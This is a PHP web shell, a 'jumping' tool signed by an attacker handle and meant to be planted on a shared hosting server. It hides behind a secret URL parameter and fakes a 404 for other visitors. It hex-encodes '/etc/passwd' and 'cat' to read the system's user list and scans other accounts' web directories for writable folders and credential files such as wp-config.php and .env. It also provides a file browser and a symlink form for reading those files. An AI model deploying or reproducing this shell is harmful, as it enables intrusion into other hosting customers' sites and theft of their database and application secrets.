<?php

/**
 * Protected Jumping Tool - Stealth Edition
 * Access: file.php?demiurge
 * by L4663r666h05t
 * t.me/laggergod
 * x.com/L4663r666h05t
 * umbra.by/L4663r666h05t
 */

echo '<html><head><meta name="robots" content="noindex, nofollow, noarchive"><meta name="googlebot" content="noindex, nofollow"></head><body>';

$secret_key = "demiurge";
if (!isset($_GET[str_rot13($secret_key)])) {
    header('HTTP/1.0 404 Not Found');
    exit;
}

error_reporting(0);
@ini_set('display_errors', 0);

$h = "hex2bin"; $b = "base64_decode"; $s = "str_rot13";
$self = "?".str_rot13($secret_key);

echo "<style>
    body{background:#0d0d0d;color:#00ff41;font-family:'Courier New',monospace;padding:20px;font-size:13px;}
    a{color:#00bcff;text-decoration:none;}
    .box{border:1px solid #333;padding:10px;background:#1a1a1a;margin-bottom:15px;overflow:auto;}
    .cfg{color:#ff8c00; font-weight:bold;}
    table{width:100%; border-spacing:0;}
    tr:hover{background:#252525;}
    input, button{background:#333; color:#0f0; border:1px solid #555; padding:3px;}
</style>";

echo "<h2>[ L4663r666h05t Terminal ]</h2>";

echo "<b>:: Server Rooms</b><div class='box' style='max-height:180px;'>";
$u_path = $h("2f6574632f706173737764");
$users = @file($u_path);
if (!$users) $users = explode("\n", @shell_exec($h("63617420") . $u_path));

foreach ((array)$users as $l) {
    $u = explode(":", $l)[0];
    if (in_array($u, ['bin','daemon','mail','nobody','sys','root']) || empty($u)) continue;
    $target = "/home/$u/public_html";
    if (@is_dir($target)) {
        echo "[+] <a href='$self&dir=$target'>$target</a> ";
        if (@is_writable($target)) echo "<span style='color:red;'>[RW]</span>";

        foreach(['wp-config.php','configuration.php','.env'] as $f) {
            if(@file_exists("$target/$f")) echo " <span class='cfg'>[$f]</span>";
        }
        echo "<br>";
    }
}
echo "</div>";

if(isset($_POST['sympath'])) {
    $target_file = $_POST['sympath'];
    $link_name = "sym_".time().".txt";
    if(@symlink($target_file, $link_name)) {
        echo "<div class='box' style='color:yellow;'>Symlink Created: <a href='$link_name' target='_blank'>$link_name</a></div>";
    } else {
        echo "<div class='box' style='color:red;'>Symlink Failed.</div>";
    }
}

$current_dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
$current_dir = realpath($current_dir);
echo "<b>:: Path: $current_dir</b><div class='box'>";
$items = @scandir($current_dir);
echo "<table>";
echo "<tr><td>[D]</td><td><a href='$self&dir=".dirname($current_dir)."'>.. (Back)</a></td><td></td></tr>";
foreach ((array)$items as $item) {
    if ($item == "." || $item == "..") continue;
    $p = $current_dir . '/' . $item;
    $isD = @is_dir($p);
    $perm = substr(sprintf('%o', @fileperms($p)), -4);
    echo "<tr>
            <td width='50'>".($isD ? "[D]" : "[F]")."</td>
            <td><a href='$self&dir=$p'>$item</a></td>
            <td width='80'>$perm</td>
          </tr>";
}
echo "</table></div>";

echo "<b>:: Symlink Tool</b><br>
<form method='post'>
    Target File: <input type='text' name='sympath' style='width:300px;' placeholder='/home/user/public_html/wp-config.php'>
    <button type='submit'>Create Link</button>
</form>";

echo "</body></html>";
